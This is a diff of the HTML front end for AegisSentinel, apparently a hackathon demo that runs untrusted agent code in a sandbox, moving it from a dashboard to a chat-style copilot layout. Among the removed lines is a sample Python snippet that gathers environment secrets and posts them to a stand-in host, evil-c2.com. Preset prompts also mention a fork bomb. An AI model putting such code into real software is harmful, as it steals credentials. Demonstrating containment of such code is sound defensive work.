@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AegisSentinel — Autonomous Agent Immunity & Verification Engine</title>
+  <title>AegisSentinel — Autonomous AI SecOps Copilot & Verification Enclave</title>
 
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
@@ -13,29 +13,32 @@
       theme: {
         extend: {
           colors: {
-            slate: {
-              850: '#111827',
-              900: '#0f172a',
-              950: '#080d1a',
+            midnight: {
+              950: '#070a12',
+              900: '#0b0f19',
+              850: '#111726',
+              800: '#182032',
+              700: '#232f48',
             },
-            brand: {
-              50: '#f0f9ff',
-              100: '#e0f2fe',
-              500: '#0284c7',
-              600: '#0369a1',
-              700: '#075985',
+            accent: {
+              cyan: '#06b6d4',
+              sky: '#0ea5e9',
+              blue: '#3b82f6',
+              emerald: '#10b981',
+              rose: '#f43f5e',
+              amber: '#f59e0b',
             }
           },
           fontFamily: {
-            mono: ['"JetBrains Mono"', 'ui-monospace', 'monospace'],
             sans: ['"Inter"', 'ui-sans-serif', 'system-ui', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'ui-monospace', 'monospace'],
           }
         }
       }
     }
   </script>
 
-  <!-- Fonts & Icons -->
+  <!-- Google Fonts & FontAwesome -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
@@ -44,1041 +47,909 @@
 
   <style>
     body {
-      background-color: #070b14;
+      background-color: #070a12;
       color: #e2e8f0;
       font-family: 'Inter', sans-serif;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
-
-    /* Subtle professional grid pattern */
-    .bg-grid-subtle {
-      background-image: linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
-                        linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
-      background-size: 32px 32px;
-    }
-
-    /* Clean Card Surfaces */
-    .panel-card {
-      background: #0d1424;
-      border: 1px solid #1e293b;
-      box-shadow: 0 4px 20px -2px rgba(0, 0, 0, 0.5);
-    }
-
-    .panel-card-accent {
-      background: #0d1424;
-      border: 1px solid #334155;
     }
 
     /* Custom Slim Scrollbars */
     ::-webkit-scrollbar {
-      width: 6px;
-      height: 6px;
+      width: 5px;
+      height: 5px;
     }
     ::-webkit-scrollbar-track {
-      background: #090e1a;
+      background: #0b0f19;
     }
     ::-webkit-scrollbar-thumb {
       background: #1e293b;
-      border-radius: 3px;
+      border-radius: 4px;
     }
     ::-webkit-scrollbar-thumb:hover {
       background: #334155;
     }
 
-    /* Tab active styles */
-    .nav-tab.active {
-      color: #38bdf8;
-      border-bottom: 2px solid #38bdf8;
-      background: rgba(56, 189, 248, 0.04);
+    /* Glass Surfaces */
+    .glass-panel {
+      background: rgba(17, 23, 38, 0.75);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.07);
     }
-    .nav-tab {
-      border-bottom: 2px solid transparent;
-      transition: all 0.15s ease-in-out;
+
+    .glass-card {
+      background: #0f1627;
+      border: 1px solid #1e293b;
+      transition: all 0.2s ease-in-out;
+    }
+    .glass-card:hover {
+      border-color: #38bdf8;
+      box-shadow: 0 4px 20px -2px rgba(14, 165, 233, 0.15);
+    }
+
+    /* Pulse animation */
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.85); }
+    }
+    .status-pulse {
+      animation: pulse-dot 2s infinite ease-in-out;
     }
   </style>
 </head>
-<body class="bg-grid-subtle antialiased text-slate-200">
 
-  <!-- TOP NAVIGATION HEADER -->
-  <header class="border-b border-slate-800/80 bg-[#070b14]/95 backdrop-blur-md sticky top-0 z-40">
-    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
+<body class="h-screen flex flex-col overflow-hidden text-slate-200 antialiased selection:bg-cyan-500/20 selection:text-cyan-300">
 
-      <!-- Product Brand -->
-      <div class="flex items-center space-x-3">
-        <div class="w-9 h-9 rounded-lg bg-sky-500/10 border border-sky-500/30 flex items-center justify-center text-sky-400">
-          <i class="fa-solid fa-shield-halved text-lg"></i>
+  <!-- ================= TOP EXECUTIVE NAVIGATION BAR ================= -->
+  <header class="h-14 border-b border-slate-800/80 bg-midnight-900/90 backdrop-blur-md px-4 sm:px-6 flex items-center justify-between shrink-0 z-30">
+    <!-- Left: Brand & Mobile Sidebar Toggle -->
+    <div class="flex items-center gap-3">
+      <button onclick="toggleSidebar()" class="md:hidden text-slate-400 hover:text-white p-1.5 rounded-lg border border-slate-800 hover:bg-slate-800/60 transition">
+        <i class="fa-solid fa-bars text-sm"></i>
+      </button>
+
+      <div class="flex items-center gap-2.5">
+        <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center text-white shadow-lg shadow-cyan-500/20">
+          <i class="fa-solid fa-shield-halved text-sm"></i>
         </div>
         <div>
           <div class="flex items-center gap-2">
-            <span class="text-base font-bold tracking-tight text-white font-mono">AEGIS<span class="text-sky-400">SENTINEL</span></span>
-            <span class="px-1.5 py-0.5 text-[10px] font-mono font-medium rounded bg-slate-800 text-slate-300 border border-slate-700">v2.4</span>
-            <span class="hidden sm:inline-flex items-center gap-1 px-2 py-0.5 text-[11px] font-mono text-emerald-400 bg-emerald-950/40 border border-emerald-800/50 rounded-full">
-              <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
-              Live
-            </span>
+            <span class="text-sm font-semibold tracking-tight text-white">AegisSentinel</span>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-cyan-950/80 text-cyan-400 border border-cyan-800/60 font-medium">SecOps Copilot</span>
           </div>
-          <p class="text-[11px] text-slate-400 hidden sm:block">Vultr Agent Rush &bull; 1-Click Containment Moment &bull; Autonomous Agent Immunity</p>
+          <div class="text-[11px] text-slate-400 hidden sm:block">Autonomous AI Security &bull; Blast Radius Zero</div>
         </div>
       </div>
+    </div>
 
-      <!-- Runtime Metadata Badges -->
-      <div class="hidden md:flex items-center space-x-2 text-xs font-mono text-slate-400">
-        <div class="px-2.5 py-1 rounded-md bg-slate-900 border border-slate-800 flex items-center gap-1.5">
-          <span class="text-slate-500">ISOLATION:</span>
-          <span class="text-slate-200 font-semibold" id="top-runtime">{{ RUNTIME_ENGINE }}</span>
-        </div>
-        <div class="px-2.5 py-1 rounded-md bg-slate-900 border border-slate-800 flex items-center gap-1.5">
-          <span class="text-slate-500">MODEL:</span>
-          <span class="text-sky-400 font-semibold" id="top-model">{{ DEFAULT_MODEL }}</span>
-        </div>
+    <!-- Center: Enclave Status Badges -->
+    <div class="hidden lg:flex items-center gap-3 text-xs font-mono">
+      <div class="px-2.5 py-1 rounded-full bg-slate-900 border border-slate-800 flex items-center gap-2">
+        <span class="w-2 h-2 rounded-full bg-emerald-400 status-pulse"></span>
+        <span class="text-slate-400">Enclave:</span>
+        <span class="text-slate-200 font-semibold">{{ RUNTIME_ENGINE }}</span>
       </div>
-
-      <!-- Right Actions: GitHub & Status -->
-      <div class="flex items-center space-x-3">
-        <div class="text-right hidden lg:block font-mono">
-          <div class="text-xs text-slate-300" id="utc-clock">00:00:00 UTC</div>
-          <div class="text-[10px] text-slate-500">mcpbox.app &bull; Zero Open Ports</div>
-        </div>
-        <a href="https://github.com/deya-darweesh/aegis-sentinel-vultr.git" target="_blank" rel="noopener noreferrer"
-           class="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 transition text-sm flex items-center gap-1.5"
-           title="View Source on GitHub">
-          <i class="fa-brands fa-github text-base"></i>
-          <span class="text-xs font-mono hidden sm:inline">Source</span>
-        </a>
+      <div class="px-2.5 py-1 rounded-full bg-slate-900 border border-slate-800 flex items-center gap-2">
+        <i class="fa-solid fa-server text-cyan-400 text-[10px]"></i>
+        <span class="text-slate-400">Node:</span>
+        <span class="text-slate-200">Vultr Atlanta (VX1)</span>
       </div>
+      <div class="px-2.5 py-1 rounded-full bg-slate-900 border border-slate-800 flex items-center gap-2">
+        <i class="fa-solid fa-key text-amber-400 text-[10px]"></i>
+        <span class="text-slate-400">Signer:</span>
+        <span class="text-slate-200">{{ PUBLIC_KEY }}...</span>
+      </div>
+    </div>
 
+    <!-- Right: Action Controls -->
+    <div class="flex items-center gap-2">
+      <button onclick="runChaosTest()" id="btn-chaos-top"
+              class="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-lg bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 border border-amber-500/30 text-xs font-mono font-medium transition">
+        <i class="fa-solid fa-bolt text-amber-400"></i>
+        <span>1-Click Chaos Test</span>
+      </button>
+
+      <button onclick="toggleTerminalDrawer()" id="btn-toggle-terminal"
+              class="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 text-xs font-mono transition">
+        <i class="fa-solid fa-terminal text-cyan-400"></i>
+        <span class="hidden sm:inline">Terminal</span>
+      </button>
+
+      <button onclick="clearChatThread()" title="Clear Chat Thread"
+              class="p-2 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800/60 border border-transparent hover:border-slate-800 transition">
+        <i class="fa-solid fa-rotate-right text-xs"></i>
+      </button>
     </div>
   </header>
 
-  <!-- MAIN APP CONTAINER -->
-  <main class="max-w-6xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6 flex-1">
 
-    <!-- HERO / MISSION STATEMENT -->
-    <div class="panel-card rounded-xl p-5 sm:p-6">
-      <div class="max-w-3xl">
-        <div class="inline-flex items-center gap-2 px-2.5 py-1 rounded-md bg-sky-500/10 border border-sky-500/20 text-sky-400 text-xs font-mono mb-3">
-          <i class="fa-solid fa-lock text-[11px]"></i>
-          <span>Air-Gapped MicroVM Quarantine &bull; Proof-Carrying Cryptographic Receipts</span>
-        </div>
-        <h1 class="text-xl sm:text-2xl font-bold text-white tracking-tight">
-          Adversarial Immunity Engine for Autonomous Microservices
-        </h1>
-        <p class="mt-2 text-sm text-slate-300 leading-relaxed">
-          Subject untrusted AI agent code to automated Red-Team adversarial probes inside a sealed gVisor container.
-          When vulnerabilities or resource exhaustion exploits are intercepted, Blue-Team synthesis generates an invariant-preserving
-          hotpatch with an <span class="text-white font-medium">Ed25519 digital signature</span> and tamper-proof SHA-256 audit chain.
-        </p>
+  <!-- ================= MAIN VIEWPORT (SIDEBAR + CONVERSATIONAL CANVAS) ================= -->
+  <div class="flex-1 flex overflow-hidden relative">
+
+    <!-- BACKDROP FOR MOBILE SIDEBAR -->
+    <div id="sidebar-backdrop" onclick="toggleSidebar()" class="fixed inset-0 bg-black/60 z-20 hidden md:hidden"></div>
+
+    <!-- LEFT SIDEBAR: SESSIONS & THREAT PRESETS -->
+    <aside id="copilot-sidebar"
+           class="w-72 bg-midnight-900 border-r border-slate-800/80 flex flex-col shrink-0 absolute md:static inset-y-0 left-0 z-20 transform -translate-x-full md:translate-x-0 transition-transform duration-200 ease-in-out">
+
+      <!-- New Chat Button -->
+      <div class="p-3.5 border-b border-slate-800/80">
+        <button onclick="startNewSession()"
+                class="w-full py-2.5 px-3.5 rounded-lg bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-medium text-xs flex items-center justify-center gap-2 shadow-sm transition">
+          <i class="fa-solid fa-plus text-xs"></i>
+          <span>New Security Audit</span>
+        </button>
       </div>
 
-      <!-- Quick Metrics Summary Bar -->
-      <div class="mt-5 pt-4 border-t border-slate-800/80 grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs font-mono">
-        <div>
-          <span class="text-slate-500 block">Sandbox Blast Radius</span>
-          <span class="text-slate-200 font-semibold mt-0.5 block flex items-center gap-1.5">
-            <span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> Zero (Network Denied)
-          </span>
+      <!-- Quick Threat Scenario Presets -->
+      <div class="p-3.5 border-b border-slate-800/80 space-y-2">
+        <div class="text-[10px] font-mono font-semibold text-slate-400 uppercase tracking-wider flex items-center justify-between">
+          <span>Target Presets</span>
+          <span class="text-cyan-400">Air-Gapped</span>
         </div>
-        <div>
-          <span class="text-slate-500 block">cgroups v2 Quota</span>
-          <span class="text-slate-200 font-semibold mt-0.5 block">256MB RAM / 100 PIDs</span>
-        </div>
-        <div>
-          <span class="text-slate-500 block">Watchdog Timeout</span>
-          <span class="text-slate-200 font-semibold mt-0.5 block">12.0s Hard SIGKILL</span>
-        </div>
-        <div>
-          <span class="text-slate-500 block">Proof Verifier</span>
-          <span class="text-slate-200 font-semibold mt-0.5 block">Ed25519 Signature</span>
-        </div>
-      </div>
-    </div>
-
-    <!-- ENTRY POINT WORKSPACE: SELECT SCENARIO & LAUNCH DUEL -->
-    <div class="panel-card rounded-xl overflow-hidden">
-
-      <!-- Section Title & Tabs -->
-      <div class="p-4 sm:p-5 border-b border-slate-800/80 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-        <div>
-          <h2 class="text-sm font-semibold text-white tracking-tight flex items-center gap-2">
-            <span class="w-5 h-5 rounded bg-sky-500/20 text-sky-400 flex items-center justify-center text-xs font-mono font-bold">1</span>
-            Target Code & Adversarial Attack Vector
-          </h2>
-          <p class="text-xs text-slate-400 mt-0.5">Select a predefined attack vector or enter custom Python code to test against the containment sandbox.</p>
-        </div>
-        <div class="flex items-center gap-2">
-          <span class="text-xs font-mono text-slate-400">Mode:</span>
-          <span class="px-2 py-0.5 rounded bg-slate-800 text-slate-300 text-xs font-mono border border-slate-700">Autonomous 2-Round Duel</span>
-        </div>
-      </div>
-
-      <div class="p-4 sm:p-5 space-y-4">
-
-        <!-- Scenario Selection Cards -->
-        <div class="grid grid-cols-1 sm:grid-cols-3 gap-3" id="scenario-selector">
-
-          <!-- Scenario 1: Supply Chain -->
-          <button onclick="selectScenario('SUPPLY_CHAIN_LEAK')" id="btn-scenario-SUPPLY_CHAIN_LEAK"
-                  class="scenario-btn text-left p-3.5 rounded-lg border border-sky-500/40 bg-sky-500/5 hover:border-sky-500/60 transition group">
-            <div class="flex items-center justify-between mb-1.5">
-              <span class="text-[11px] font-mono font-semibold text-sky-400 uppercase tracking-wider">Vector Alpha</span>
-              <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-slate-800 text-slate-400">CWE-200</span>
+        <div class="space-y-1.5 text-xs">
+          <button onclick="sendPresetPrompt('Audit our payment gateway service for credential exfiltration and unauthorized network sockets')"
+                  class="w-full text-left p-2 rounded-lg hover:bg-slate-800/60 border border-transparent hover:border-slate-800 transition flex items-center gap-2.5 group">
+            <div class="w-6 h-6 rounded bg-rose-500/10 text-rose-400 flex items-center justify-center text-[10px] font-mono shrink-0">
+              <i class="fa-solid fa-shield-virus"></i>
             </div>
-            <div class="text-sm font-semibold text-white group-hover:text-sky-300 transition">Supply-Chain Exfiltration</div>
-            <p class="text-xs text-slate-400 mt-1 leading-normal">
-              Malicious package extracts environment secrets and attempts socket exfiltration outside sandbox.
-            </p>
+            <div class="truncate">
+              <div class="text-slate-200 group-hover:text-white font-medium truncate">Payment Gateway</div>
+              <div class="text-[10px] text-slate-400 truncate">CWE-200 Secret Leak</div>
+            </div>
           </button>
 
-          <!-- Scenario 2: Memory / Fork Bomb -->
-          <button onclick="selectScenario('FORK_MEMORY_EXHAUSTION')" id="btn-scenario-FORK_MEMORY_EXHAUSTION"
-                  class="scenario-btn text-left p-3.5 rounded-lg border border-slate-800 bg-slate-900/60 hover:border-slate-700 transition group">
-            <div class="flex items-center justify-between mb-1.5">
-              <span class="text-[11px] font-mono font-semibold text-slate-400 uppercase tracking-wider">Vector Beta</span>
-              <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-slate-800 text-slate-400">CWE-400</span>
+          <button onclick="sendPresetPrompt('Detonate recursive memory allocator fork bomb to test cgroups memory ceiling limits')"
+                  class="w-full text-left p-2 rounded-lg hover:bg-slate-800/60 border border-transparent hover:border-slate-800 transition flex items-center gap-2.5 group">
+            <div class="w-6 h-6 rounded bg-amber-500/10 text-amber-400 flex items-center justify-center text-[10px] font-mono shrink-0">
+              <i class="fa-solid fa-bomb"></i>
             </div>
-            <div class="text-sm font-semibold text-white group-hover:text-sky-300 transition">Memory & Fork Exhaustion</div>
-            <p class="text-xs text-slate-400 mt-1 leading-normal">
-              Exponential recursive memory allocator attempting to exhaust host RAM and trigger kernel panic.
-            </p>
+            <div class="truncate">
+              <div class="text-slate-200 group-hover:text-white font-medium truncate">Memory Fork Bomb</div>
+              <div class="text-[10px] text-slate-400 truncate">CWE-400 Resource Exhaustion</div>
+            </div>
           </button>
 
-          <!-- Scenario 3: Financial Invariant -->
-          <button onclick="selectScenario('FINANCIAL_INVARIANT_BUG')" id="btn-scenario-FINANCIAL_INVARIANT_BUG"
-                  class="scenario-btn text-left p-3.5 rounded-lg border border-slate-800 bg-slate-900/60 hover:border-slate-700 transition group">
-            <div class="flex items-center justify-between mb-1.5">
-              <span class="text-[11px] font-mono font-semibold text-slate-400 uppercase tracking-wider">Vector Gamma</span>
-              <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-slate-800 text-slate-400">CWE-682</span>
+          <button onclick="sendPresetPrompt('Audit transaction settlement engine for IEEE 754 decimal rounding drift and broken balance invariants')"
+                  class="w-full text-left p-2 rounded-lg hover:bg-slate-800/60 border border-transparent hover:border-slate-800 transition flex items-center gap-2.5 group">
+            <div class="w-6 h-6 rounded bg-sky-500/10 text-sky-400 flex items-center justify-center text-[10px] font-mono shrink-0">
+              <i class="fa-solid fa-scale-balanced"></i>
             </div>
-            <div class="text-sm font-semibold text-white group-hover:text-sky-300 transition">Financial Invariant Drift</div>
-            <p class="text-xs text-slate-400 mt-1 leading-normal">
-              Precision float arithmetic drift corrupting token balances and ledger state in transaction logic.
-            </p>
+            <div class="truncate">
+              <div class="text-slate-200 group-hover:text-white font-medium truncate">Financial Settlement</div>
+              <div class="text-[10px] text-slate-400 truncate">CWE-682 Float Drift</div>
+            </div>
           </button>
-
-        </div>
-
-        <!-- Code Editor / Preview Block -->
-        <div class="rounded-lg border border-slate-800 bg-slate-950/80 overflow-hidden">
-          <div class="px-3.5 py-2 border-b border-slate-800/80 bg-slate-900/60 flex items-center justify-between">
-            <div class="flex items-center gap-2">
-              <span class="w-2.5 h-2.5 rounded-full bg-slate-700"></span>
-              <span class="text-xs font-mono text-slate-400" id="editor-filename">target_microservice.py</span>
-            </div>
-            <div class="flex items-center gap-2 text-xs font-mono text-slate-400">
-              <span id="editor-line-count">12 lines</span>
-              <span>&bull;</span>
-              <span>Python 3.12</span>
-            </div>
-          </div>
-          <div class="p-3.5 font-mono text-xs text-slate-300 overflow-x-auto max-h-48 leading-relaxed">
-            <pre id="scenario-code-preview" class="whitespace-pre"># Untrusted Target Code: Vector Alpha (Supply Chain Backdoor)
-import os, urllib.request
-
-def handler():
-    # Attempt credential harvesting
-    env_keys = {k: v for k, v in os.environ.items() if "KEY" in k or "SECRET" in k}
-    # Attempt outbound exfiltration over HTTP
-    req = urllib.request.Request("http://evil-c2.com/exfiltrate", data=str(env_keys).encode())
-    urllib.request.urlopen(req, timeout=2) # Trapped by sandbox air-gap!
-    return {"status": "dispatched"}</pre>
-          </div>
-        </div>
-
-        <!-- Primary Action Callout Row -->
-        <div class="pt-2 flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
-          <div class="flex items-center gap-2 text-xs text-slate-400 font-mono">
-            <i class="fa-solid fa-circle-info text-sky-400"></i>
-            <span id="action-hint">Ready. Click 'Verify & Vaccinate' to initiate containment duel.</span>
-          </div>
-
-          <div class="flex items-center gap-2.5">
-            <button onclick="runChaosProbe()" id="btn-chaos"
-                    class="px-4 py-2.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 font-mono text-xs font-semibold transition flex items-center justify-center gap-2">
-              <i class="fa-solid fa-bolt text-amber-400"></i>
-              <span>1-Click Chaos Probe</span>
-            </button>
-
-            <button onclick="executeSelectedDuel()" id="btn-primary-duel"
-                    class="px-5 py-2.5 rounded-lg bg-sky-600 hover:bg-sky-500 text-white font-mono text-xs font-semibold shadow-md shadow-sky-600/20 transition flex items-center justify-center gap-2 focus:ring-2 focus:ring-sky-400 focus:outline-none">
-              <i class="fa-solid fa-play text-xs"></i>
-              <span id="primary-btn-text">Verify & Vaccinate Microservice</span>
-            </button>
-          </div>
-        </div>
-
-      </div>
-    </div>
-
-    <!-- STAGE 2: EXECUTION PROGRESS & STATUS BANNER (ACTIVE DURING EXECUTION) -->
-    <div id="execution-stepper-panel" class="panel-card rounded-xl p-5 hidden">
-      <div class="flex items-center justify-between mb-4">
-        <h3 class="text-xs font-mono font-semibold uppercase tracking-wider text-slate-400 flex items-center gap-2">
-          <span class="w-2 h-2 rounded-full bg-sky-400 animate-ping"></span>
-          Autonomous Immunity Pipeline in Progress
-        </h3>
-        <span class="text-xs font-mono text-sky-400" id="pipeline-elapsed-time">Elapsed: 0.0s</span>
-      </div>
-
-      <!-- 4-Stage Stepper -->
-      <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs font-mono">
-        <div id="step-1" class="p-3 rounded-lg border border-sky-500/40 bg-sky-500/10 text-sky-300">
-          <div class="flex items-center justify-between">
-            <span class="font-bold">1. AST PRE-FLIGHT</span>
-            <i class="fa-solid fa-spinner fa-spin text-sky-400" id="step-1-icon"></i>
-          </div>
-          <p class="text-[11px] text-slate-400 mt-1">Syntax & Forbidden Syscall Guard</p>
-        </div>
-
-        <div id="step-2" class="p-3 rounded-lg border border-slate-800 bg-slate-900/60 text-slate-400">
-          <div class="flex items-center justify-between">
-            <span class="font-bold">2. CONTAINMENT RUN</span>
-            <i class="fa-regular fa-clock" id="step-2-icon"></i>
-          </div>
-          <p class="text-[11px] text-slate-400 mt-1">gVisor Sandbox Isolation</p>
-        </div>
-
-        <div id="step-3" class="p-3 rounded-lg border border-slate-800 bg-slate-900/60 text-slate-400">
-          <div class="flex items-center justify-between">
-            <span class="font-bold">3. ADVERSARIAL DUEL</span>
-            <i class="fa-regular fa-clock" id="step-3-icon"></i>
-          </div>
-          <p class="text-[11px] text-slate-400 mt-1">Breaker vs Maker Hotpatching</p>
-        </div>
-
-        <div id="step-4" class="p-3 rounded-lg border border-slate-800 bg-slate-900/60 text-slate-400">
-          <div class="flex items-center justify-between">
-            <span class="font-bold">4. ED25519 NOTARY</span>
-            <i class="fa-regular fa-clock" id="step-4-icon"></i>
-          </div>
-          <p class="text-[11px] text-slate-400 mt-1">Cryptographic Proof & Digest</p>
         </div>
       </div>
-    </div>
 
-    <!-- STAGE 3: EXECUTIVE VERDICT & INVESTIGATION RESULTS -->
-    <div id="results-container" class="space-y-6">
+      <!-- Recent Audit History -->
+      <div class="flex-1 overflow-y-auto p-3.5 space-y-2">
+        <div class="text-[10px] font-mono font-semibold text-slate-400 uppercase tracking-wider flex items-center justify-between">
+          <span>Recent Missions</span>
+          <button onclick="loadMissionHistory()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-rotate text-[10px]"></i></button>
+        </div>
+        <div id="mission-history-list" class="space-y-1.5 text-xs font-mono text-slate-400">
+          <div class="p-2 rounded bg-slate-900/40 border border-slate-800/50 flex items-center justify-between">
+            <span class="truncate">payment-gateway</span>
+            <span class="px-1.5 py-0.5 rounded bg-emerald-950 text-emerald-400 text-[9px]">VERIFIED</span>
+          </div>
+          <div class="p-2 rounded bg-slate-900/40 border border-slate-800/50 flex items-center justify-between">
+            <span class="truncate">memory-fork-worker</span>
+            <span class="px-1.5 py-0.5 rounded bg-emerald-950 text-emerald-400 text-[9px]">VERIFIED</span>
+          </div>
+        </div>
+      </div>
 
-      <!-- Executive Verdict Banner -->
-      <div id="verdict-banner" class="panel-card rounded-xl p-5 border-l-4 border-l-emerald-500 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
-        <div class="flex items-center space-x-3.5">
-          <div class="w-10 h-10 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 text-lg">
-            <i class="fa-solid fa-circle-check"></i>
+      <!-- Cryptographic Ledger Attestation Box -->
+      <div class="p-3.5 border-t border-slate-800/80 bg-slate-950/60 space-y-2">
+        <div class="flex items-center justify-between text-[11px] font-mono">
+          <span class="text-slate-400">Audit Ledger Root:</span>
+          <span class="text-amber-400 font-semibold">{{ LATEST_HASH }}...</span>
+        </div>
+        <div class="text-[10px] text-slate-400 flex items-center gap-1.5">
+          <i class="fa-solid fa-certificate text-emerald-400"></i>
+          <span>Hardware Ed25519 Notary Verified</span>
+        </div>
+      </div>
+    </aside>
+
+
+    <!-- CENTER: CHATGPT-STYLE CONVERSATIONAL CANVAS -->
+    <main class="flex-1 flex flex-col bg-midnight-950 overflow-hidden relative">
+
+      <!-- Chat Thread Messages Container -->
+      <div id="chat-thread-container" class="flex-1 overflow-y-auto p-4 sm:p-6 lg:p-8 space-y-6">
+
+        <!-- Welcome Banner / Hero State -->
+        <div id="welcome-hero-card" class="max-w-3xl mx-auto py-8 sm:py-12 text-center space-y-5">
+          <div class="w-16 h-16 rounded-2xl bg-gradient-to-tr from-cyan-500/20 to-blue-500/20 border border-cyan-500/30 flex items-center justify-center mx-auto text-cyan-400 text-2xl shadow-xl shadow-cyan-500/10">
+            <i class="fa-solid fa-microchip"></i>
           </div>
           <div>
-            <div class="flex items-center gap-2">
-              <span class="text-xs font-mono font-bold text-emerald-400 uppercase tracking-wider">Status: Complete</span>
-              <span class="text-xs font-mono text-slate-500">&bull;</span>
-              <span class="text-xs font-mono text-slate-300" id="verdict-mission-id">Mission: msn-ready</span>
-            </div>
-            <div class="text-base font-bold text-white tracking-tight" id="verdict-title">
-              Microservice Vaccinated & Verified Secure
-            </div>
-            <p class="text-xs text-slate-400 mt-0.5" id="verdict-subtitle">
-              All malicious vectors neutralized. Retaliation tests succeeded with zero regression.
-            </p>
-          </div>
-        </div>
-
-        <!-- High-level stats pill row -->
-        <div class="flex items-center gap-3 text-xs font-mono w-full md:w-auto justify-between md:justify-end border-t md:border-t-0 pt-3 md:pt-0 border-slate-800">
-          <div class="px-3 py-1.5 rounded-md bg-slate-900 border border-slate-800 text-center">
-            <span class="text-slate-500 block text-[10px]">TIME</span>
-            <span class="text-slate-200 font-semibold" id="stat-duration">142.8 ms</span>
-          </div>
-          <div class="px-3 py-1.5 rounded-md bg-slate-900 border border-slate-800 text-center">
-            <span class="text-slate-500 block text-[10px]">PEAK RAM</span>
-            <span class="text-slate-200 font-semibold" id="stat-peak-ram">14.2 MB</span>
-          </div>
-          <div class="px-3 py-1.5 rounded-md bg-slate-900 border border-slate-800 text-center">
-            <span class="text-slate-500 block text-[10px]">VERDICT</span>
-            <span class="text-emerald-400 font-semibold" id="stat-verdict">IMMUNIZED</span>
-          </div>
-        </div>
-      </div>
-
-      <!-- PROGRESSIVE DISCLOSURE TABS -->
-      <div class="panel-card rounded-xl overflow-hidden">
-
-        <!-- Navigation Tabs Bar -->
-        <div class="border-b border-slate-800/80 bg-slate-900/40 px-4 sm:px-6 flex items-center space-x-1 sm:space-x-6 overflow-x-auto text-xs font-medium">
-          <button onclick="switchTab('duel')" id="tab-btn-duel"
-                  class="nav-tab active py-3.5 px-2 flex items-center gap-2 whitespace-nowrap text-slate-400 hover:text-white">
-            <i class="fa-solid fa-code-compare"></i>
-            <span>Adversarial Duel (Maker vs Breaker)</span>
-          </button>
-          <button onclick="switchTab('proof')" id="tab-btn-proof"
-                  class="nav-tab py-3.5 px-2 flex items-center gap-2 whitespace-nowrap text-slate-400 hover:text-white">
-            <i class="fa-solid fa-certificate"></i>
-            <span>Cryptographic Receipt</span>
-          </button>
-          <button onclick="switchTab('terminal')" id="tab-btn-terminal"
-                  class="nav-tab py-3.5 px-2 flex items-center gap-2 whitespace-nowrap text-slate-400 hover:text-white">
-            <i class="fa-solid fa-terminal"></i>
-            <span>Live Terminal Log</span>
-          </button>
-          <button onclick="switchTab('audit')" id="tab-btn-audit"
-                  class="nav-tab py-3.5 px-2 flex items-center gap-2 whitespace-nowrap text-slate-400 hover:text-white">
-            <i class="fa-solid fa-link"></i>
-            <span>Hash-Chained Audit Ledger</span>
-          </button>
-          <button onclick="switchTab('multimodal')" id="tab-btn-multimodal"
-                  class="nav-tab py-3.5 px-2 flex items-center gap-2 whitespace-nowrap text-slate-400 hover:text-white">
-            <i class="fa-solid fa-wand-magic-sparkles"></i>
-            <span>Multimodal Tools</span>
-          </button>
-        </div>
-
-        <!-- TAB CONTENT 1: ADVERSARIAL DUEL (MAKER VS BREAKER) -->
-        <div id="tab-content-duel" class="p-5 space-y-5">
-          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-
-            <!-- Red Team (Breaker Exploit) Card -->
-            <div class="rounded-lg border border-slate-800 bg-slate-950/60 p-4 space-y-3">
-              <div class="flex items-center justify-between border-b border-slate-800/80 pb-2.5">
-                <div class="flex items-center gap-2">
-                  <span class="w-2.5 h-2.5 rounded-full bg-rose-500"></span>
-                  <span class="text-xs font-mono font-bold text-white">RED AGENT: ADVERSARY</span>
-                </div>
-                <span id="red-badge" class="px-2 py-0.5 rounded text-[10px] font-mono bg-rose-950/60 text-rose-300 border border-rose-800/50">
-                  BLOCKED BY AIR-GAP
-                </span>
-              </div>
-              <p class="text-xs text-slate-300" id="red-explanation">
-                Synthesized weaponized exfiltration script attempting to read environment keys and transmit to evil-c2.com.
-              </p>
